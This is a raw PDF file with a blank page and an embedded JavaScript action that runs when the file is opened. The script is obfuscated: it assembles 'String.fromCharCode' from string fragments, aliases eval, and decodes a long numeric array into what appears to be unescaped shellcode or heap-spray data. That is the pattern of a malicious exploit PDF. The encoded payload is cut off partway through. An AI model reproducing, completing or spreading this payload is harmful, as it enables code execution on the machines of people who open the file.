%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 25472>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
MnDUq2Eigrz="c";VrUxYejAAp="h";FO6gEUs0X="de";FLFJ2HNhl3d="A";
NyRzNK6 = MnDUq2Eigrz+VrUxYejAAp+"arC"+"o"+FO6gEUs0X+FLFJ2HNhl3d;
LHCwWIu7u9DH = 223; DePdXy69vmK = 32; MOvf = eval;ertnmnMIb = 65; 
hempLqUA5="ret";MPWk43P="St";q749Htdi="rin";hlg6rmF6aL8="g.f";S80s1hy="ar";
ZcqAvcODzg=hempLqUA5+"urn"+" "+MPWk43P+q749Htdi+hlg6rmF6aL8+"r"+"o"+"mCh"+S80s1hy+"C"+"ode"+"((((c = c.NyRzNK6(0)) & LHCwWIu7u9DH) - 52) %26 + (c & DePdXy69vmK) + ertnmnMIb);";
s = "24 132 111 128 46 126 111 135 122 125 111 114 46 75 46 131 124 115 129 113 111 126 115 54 48 51 131 62 79 62 79 51 131 62 79 62 79 51 131 62 79 62 79 48 57 48 51 131 83 63 82 71 51 131 65 66 82 71 51 131 67 70 64 66 51 131 67 70 67 70 51 131 65 65 67 70 51 131 80 65 82 80 51 131 62 65 63 81 51 131 65 63 81 65 51 131 68 68 81 71 51 131 83 71 70 63 51 131 84 79 68 67 51 131 65 62 70 62 51 131 66 62 64 63 51 131 84 79 83 64 51 131 63 69 81 71 51 131 64 63 64 64 51 131 66 71 64 63 51 131 62 63 64 63 51 131 64 63 64 63 51 131 64 63 66 80 51 131 84 63 82 83 51 131 64 63 71 70 51 131 64 63 65 63 51 131 79 79 64 63 51 131 81 79 82 71 51 131 69 84 64 66 51 131 70 67 82 64 51 131 84 63 82 83 51 131 82 69 81 71 51 131 82 83 82 83 51 131 81 71 82 83 51 131 64 64 63 81 51 131 64 63 64 63 51 131 82 71 79 79 51 131 63 71 81 71 51 131 64 63 64 63 51 131 81 71 64 63 51 131 64 62 68 81 51 131 64 63 64 63 51 131 68 69 81 71 51 131 64 63 64 63 51 131 81 71 64 63 51 131 64 64 84 79 51 131 64 63 64 63 51 131 82 71 79 79 51 131 62 65 81 71 51 131 64 63 64 63 51 131 81 71 64 63 51 131 64 62 68 67 51 131 64 63 64 63 51 131 63 63 81 71 51 131 64 63 64 63 51 131 81 71 64 63 51 131 64 64 79 70 51 131 64 63 64 63 51 131 82 71 79 79 51 131 64 82 81 71 51 131 64 63 64 63 51 131 81 71 64 63 51 131 64 62 66 62 51 131 64 63 64 63 51 131 65 80 81 71 51 131 64 63 64 63 51 131 81 79 64 63 51 131 69 64 69 71 51 131 84 82 79 79 51 131 66 80 69 64 51 131 66 71 68 63 51 131 65 63 64 63 51 131 64 63 64 63 51 131 81 71 69 68 51 131 64 65 71 62 51 131 64 63 64 63 51 131 81 66 81 71 51 131 64 63 64 63 51 131 69 71 64 63 51 131 69 64 83 64 51 131 84 82 79 79 51 131 66 80 69 64 51 131 66 71 62 63 51 131 65 63 64 63 51 131 64 63 64 63 51 131 81 71 69 68 51 131 64 65 80 70 51 131 64 63 64 63 51 131 83 81 81 71 51 131 64 63 64 63 51 131 69 71 64 63 51 131 69 68 83 64 51 131 63 82 81 71 51 131 64 63 64 67 51 131 79 79 64 63 51 131 63 64 82 71 51 131 68 70 83 70 51 131 83 63 63 64 51 131 83 64 71 63 51 131 82 65 82 82 51 131 79 81 70 84 51 131 82 83 68 68 51 131 83 64 69 83 51 131 63 84 69 79 51 131 64 68 83 69 51 131 63 84 71 71 51 131 69 83 79 70 51 131 66 69 64 62 51 131 83 68 63 84 51 131 64 66 68 68 51 131 81 63 82 83 51 131 81 70 83 64 51 131 64 67 80 66 51 131 64 63 64 63 51 131 79 62 69 79 51 131 65 67 81 82 51 131 64 63 64 62 51 131 79 79 64 63 51 131 63 84 84 67 51 131 64 65 83 68 51 131 66 81 66 64 51 131 62 63 66 67 51 131 83 68 63 84 51 131 64 67 68 65 51 131 66 64 62 83 51 131 62 65 62 63 51 131 83 65 79 64 51 131 63 64 64 71 51 131 69 63 83 63 51 131 66 71 69 63 51 131 64 62 64 67 51 131 64 63 64 63 51 131 69 64 69 65 51 131 81 71 69 63 51 131 64 64 83 62 51 131 64 63 64 63 51 131 84 63 82 83 51 131 82 82 79 79 51 131 83 68 79 79 51 131 83 63 79 64 51 131 63 84 64 71 51 131 65 71 79 80 51 131 84 79 79 67 51 131 64 64 67 67 51 131 81 79 68 63 51 131 63 84 82 69 51 131 64 63 83 69 51 131 63 64 62 65 51 131 63 84 84 65 51 131 69 63 79 71 51 131 79 64 64 62 51 131 69 67 81 82 51 131 83 63 63 64 51 131 84 79 63 64 51 131 83 82 79 79 51 131 82 71 79 64 51 131 67 81 69 67 51 131 63 84 64 70 51 131 65 82 79 70 51 131 79 64 64 62 51 131 64 67 83 63 51 131 82 65 81 79 51 131 83 82 79 79 51 131 84 70 79 79 51 131 83 64 79 64 51 131 63 64 65 63 51 131 63 84 83 63 51 131 68 64 83 68 51 131 64 62 62 82 51 131 64 63 64 63 51 131 69 62 64 63 51 131 69 63 69 64 51 131 69 63 69 63 51 131 69 63 69 63 51 131 69 68 69 63 51 131 81 71 69 63 51 131 64 64 63 70 51 131 64 63 64 63 51 131 65 70 81 71 51 131 64 63 64 63 51 131 66 67 64 63 51 131 64 67 70 62 51 131 64 63 64 63 51 131 79 81 64 63 51 131 66 63 70 63 51 131 82 83 82 83 51 131 81 71 82 83 51 131 64 64 63 68 51 131 64 63 64 63 51 131 84 79 63 64 51 131 69 64 69 64 51 131 69 64 69 64 51 131 84 63 82 83 51 131 63 71 79 63 51 131 79 63 81 71 51 131 81 70 63 71 51 131 64 83 67 66 51 131 67 71 79 62 51 131 80 63 64 66 51 131 80 63 80 63 51 131 67 67 80 63 51 131 69 66 64 69 51 131 81 82 79 79 51 131 68 63 79 81 51 131 82 83 64 66 51 131 81 71 81 63 51 131 82 83 62 84 51 131 82 83 82 83 51 131 81 71 83 64 51 131 82 83 62 71 51 131 82 83 82 83 51 131 65 62 71 71 51 131 64 67 64 62 51 131 83 65 79 63 51 131 64 63 64 82 51 131 65 79 81 71 51 131 82 83 82 83 51 131 63 64 82 83 51 131 69 63 83 63 51 131 81 71 69 67 51 131 64 63 69 67 51 131 64 63 64 63 51 131 81 71 69 63 51 131 64 65 79 79 51 131 64 63 64 63 51 131 84 63 82 83 51 131 79 63 63 69 51 131 62 67 63 82 51 131 67 68 64 63 51 131 81 71 64 80 51 131 64 65 68 62 51 131 64 63 64 63 51 131 82 83 63 64 51 131 82 83 69 68 51 131 81 71 84 63 51 131 64 62 82 79 51 131 64 63 64 63 51 131 82 83 66 71 51 131 64 63 64 63 51 131 82 83 64 63 51 131 81 71 84 63 51 131 82 84 81 71 51 131 82 83 82 83 51 131 69 68 69 64 51 131 63 64 69 69 51 131 69 63 83 63 51 131 81 71 69 67 51 131 64 63 65 84 51 131 64 63 64 63 51 131 81 71 69 63 51 131 64 65 69 66 51 131 64 63 64 63 51 131 84 63 82 83 51 131 79 63 63 69 51 131 62 67 63 82 51 131 67 68 64 63 51 131 81 71 64 80 51 131 64 65 64 79 51 131 64 63 64 63 51 131 82 83 63 64 51 131 82 83 69 68 51 131 69 71 84 63 51 131 69 83 69 84 51 131 83 64 69 79 51 131 64 65 81 79 51 131 83 64 69 71 51 131 82 70 81 71 51 131 82 83 82 83 51 131 69 69 82 83 51 131 79 64 69 68 51 131 64 71 81 82 51 131 82 82 79 79 51 131 64 71 66 80 51 131 63 84 69 68 51 131 67 68 82 83 51 131 81 71 65 67 51 131 64 65 69 81 51 131 64 63 64 63 51 131 84 63 82 83 51 131 82 82 79 79 51 131 66 62 66 71 51 131 66 66 66 81 51 131 66 71 64 63 51 131 68 66 68 70 51 131 67 65 68 69 51 131 82 67 79 79 51 131 64 71 71 70 51 131 64 63 64 63 51 131 82 64 64 63 51 131 67 66 70 69 51 131 66 80 62 83 51 131 63 84 64 63 51 131 67 67 82 83 51 131 62 63 62 67 51 131 62 67 81 71 51 131 64 63 64 65 51 131 82 83 64 63 51 131 79 79 84 63 51 131 81 71 82 71 51 131 64 62 83 79 51 131 64 63 64 63 51 131 84 63 82 83 51 131 82 71 63 79 51 131 64 71 67 67 51 131 79 79 63 69 51 131 62 67 68 67 51 131 63 84 62 63 51 131 64 63 82 83 51 131 82 83 63 84 51 131 62 67 67 67 51 131 81 71 65 82 51 131 64 62 81 83 51 131 64 63 64 63 51 131 84 63 82 83 51 131 83 67 79 64 51 131 69 83 65 63 51 131 71 71 69 84 51 131 64 63 64 62 51 131 64 63 64 63 51 131 66 71 83 64 51 131 66 84 66 83 51 131 64 63 64 63 51 131 67 66 66 71 51 131 66 82 67 65 51 131 81 79 66 81 51 131 79 81 65 66 51 131 62 67 68 67 51 131 69 63 64 67 51 131 62 65 81 71 51 131 82 83 82 84 51 131 69 63 82 83 51 131 68 80 81 71 51 131 64 63 64 65 51 131 81 70 64 63 51 131 82 84 81 65 51 131 82 83 82 83 51 131 81 69 81 71 51 131 82 83 82 83 51 131 79 64 82 83 51 131 64 71 83 67 51 131 66 80 83 64 51 131 66 71 66 82 51 131 67 67 66 84 51 131 66 82 66 67 51 131 65 66 81 79 51 131 68 67 79 81 51 131 64 67 62 67 51 131 81 71 69 63 51 131 82 81 82 79 51 131 82 83 82 83 51 131 81 71 69 63 51 131 64 65 62 64 51 131 64 63 64 63 51 131 71 79 81 70 51 131 82 83 82 84 51 131 81 71 82 83 51 131 82 83 81 69 51 131 82 83 82 83 51 131 83 67 79 64 51 131 83 64 64 71 51 131 63 64 66 71 51 131 64 63 63 65 51 131 66 71 64 63 51 131 67 64 67 66 51 131 67 65 66 66 51 131 65 66 81 79 51 131 68 67 79 81 51 131 64 67 62 67 51 131 81 71 69 63 51 131 82 81 84 62 51 131 82 83 82 83 51 131 81 71 69 63 51 131 64 62 82 70 51 131 64 63 64 63 51 131 80 62 81 70 51 131 82 83 82 84 51 131 81 71 82 83 51 131 82 83 81 69 51 131 82 83 82 83 51 131 83 67 79 64 51 131 83 64 64 71 51 131 66 64 66 71 51 131 67 68 67 69 51 131 66 71 64 63 51 131 66 71 67 64 51 131 66 83 66 67 51 131 65 66 81 79 51 131 68 67 79 81 51 131 64 67 62 67 51 131 81 71 69 63 51 131 82 81 70 68 51 131 82 83 82 83 51 131 81 71 69 63 51 131 64 62 83 83 51 131 64 63 64 63 51 131 66 68 81 70 51 131 82 83 82 84 51 131 81 71 82 83 51 131 82 83 81 69 51 131 82 83 82 83 51 131 83 67 79 64 51 131 83 64 64 71 51 131 67 69 66 71 51 131 67 71 66 68 51 131 81 79 64 63 51 131 79 81 65 66 51 131 62 67 68 67 51 131 69 63 64 67 51 131 79 65 81 71 51 131 82 83 82 81 51 131 69 63 82 83 51 131 70 80 81 71 51 131 64 63 64 62 51 131 81 70 64 63 51 131 82 84 68 65 51 131 82 83 82 83 51 131 81 69 81 71 51 131 82 83 82 83 51 131 79 64 82 83 51 131 64 67 83 67 51 131 81 71 83 64 51 131 64 62 70 79 51 131 64 63 64 63 51 131 65 79 66 71 51 131 68 69 83 69 51 131 69 63 67 70 51 131 83 69 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 62 80 68 51 131 64 63 64 63 51 131 81 82 66 71 51 131 64 64 80 68 51 131 69 63 64 82 51 131 71 65 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 62 79 64 51 131 64 63 64 63 51 131 70 80 66 71 51 131 64 81 82 82 51 131 69 63 67 82 51 131 80 84 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 62 66 83 51 131 64 63 64 63 51 131 81 81 66 71 51 131 81 83 69 69 51 131 69 63 63 69 51 131 79 80 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 62 69 79 51 131 64 63 64 63 51 131 82 63 66 71 51 131 64 67 79 80 51 131 69 63 69 83 51 131 67 69 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 82 68 51 131 82 83 82 83 51 131 67 71 66 71 51 131 84 79 66 71 51 131 69 63 65 82 51 131 66 65 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 62 63 64 51 131 64 63 64 63 51 131 81 83 66 71 51 131 81 63 83 84 51 131 69 63 66 63 51 131 68 84 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 62 65 83 51 131 64 63 64 63 51 131 71 63 66 71 51 131 62 81 68 70 51 131 69 63 84 79 51 131 63 80 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 83 63 69 51 131 82 83 82 83 51 131 70 79 66 71 51 131 80 79 69 84 51 131 69 63 65 84 51 131 62 69 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 70 68 51 131 82 83 82 83 51 131 69 70 66 71 51 131 79 62 80 68 51 131 69 63 64 65 51 131 65 65 81 71 51 131 64 63 64 62 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 63 81 64 51 131 64 63 64 63 51 131 67 84 66 71 51 131 81 65 84 71 51 131 69 63 67 64 51 131 82 84 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 63 83 83 51 131 64 63 64 63 51 131 80 84 66 71 51 131 71 79 82 70 51 131 69 63 63 66 51 131 81 80 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 80 65 51 131 82 83 82 83 51 131 69 68 66 71 51 131 71 66 70 63 51 131 69 63 71 79 51 131 84 69 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 67 84 51 131 82 83 82 83 51 131 65 80 66 71 51 131 65 84 67 80 51 131 69 63 64 65 51 131 83 65 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 66 80 51 131 82 83 82 83 51 131 81 63 66 71 51 131 63 63 69 79 51 131 69 63 80 67 51 131 70 84 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 69 69 51 131 82 83 82 83 51 131 80 68 66 71 51 131 81 65 83 70 51 131 69 63 70 64 51 131 80 80 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 68 65 51 131 82 83 82 83 51 131 66 71 66 71 51 131 83 66 62 67 51 131 69 63 71 64 51 131 79 69 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 63 69 68 51 131 64 63 64 63 51 131 67 65 66 71 51 131 71 64 82 84 51 131 69 63 65 69 51 131 67 65 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 82 84 68 67 51 131 82 83 82 83 51 131 65 64 81 79 51 131 66 66 66 80 51 131 81 71 69 63 51 131 82 79 82 68 51 131 82 83 82 83 51 131 81 71 69 63 51 131 82 84 70 79 51 131 82 83 82 83 51 131 71 68 81 70 51 131 82 83 82 82 51 131 81 71 82 83 51 131 82 83 81 71 51 131 82 83 82 83 51 131 81 71 83 64 51 131 82 81 70 70 51 131 82 83 82 83 51 131 68 83 66 71 51 131 68 83 81 83 51 131 69 63 64 66 51 131 63 84 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 81 71 83 64 51 131 64 63 64 83 51 131 64 63 64 63 51 131 79 84 66 71 51 131 64 84 68 84 51 131 69 63 81 82 51 131 62 80 81 71 51 131 64 63 64 63 51 131 79 64 64 63 51 131 64 71 83 67 51 131 63 64 83 64 51 131 66 67 83 63 51 131 68 63 79 79 51 131 79 66 63 63 51 131 67 71 83 63 51 131 63 84 65 63 51 131 68 63 79 79 51 131 63 84 64 82 51 131 67 63 79 79 51 131 70 81 65 82 51 131 79 79 63 84 51 131 64 71 68 63 51 131 81 79 83 64 51 1